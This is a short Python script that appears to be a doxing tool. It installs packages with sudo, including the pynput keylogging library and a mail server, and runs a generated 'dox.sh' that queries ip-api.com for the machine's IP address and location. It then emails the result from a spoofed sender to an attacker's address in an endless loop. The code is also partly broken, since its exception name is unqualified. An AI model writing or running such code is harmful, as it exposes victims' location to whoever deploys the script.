import os
import smtplib
os.system('sudo update && sudo apt install python3-pip && pip3 install pynput && pip3 install logging && sudo apt-get install postfix && sudo apt-get install bsd-mailx && sudo service postfix start')
os.system('''echo "curl http://ip-api.com/line/" > dox.sh && chmod +x dox.sh && bash dox.sh > doxed.txt''')
sender = "spoofed@mail.com"
receivers = ['youremail@mail.com']
f = open("doxed.txt", "r")
message = (f.read())
def executeSomething():
    try:
        smtpObj = smtplib.SMTP('localhost', 25)
        smtpObj.sendmail(sender, receivers, message)
        print("Sent!")
    except SMTPException:
        print("Error: unable to send email")
while True:
    executeSomething()

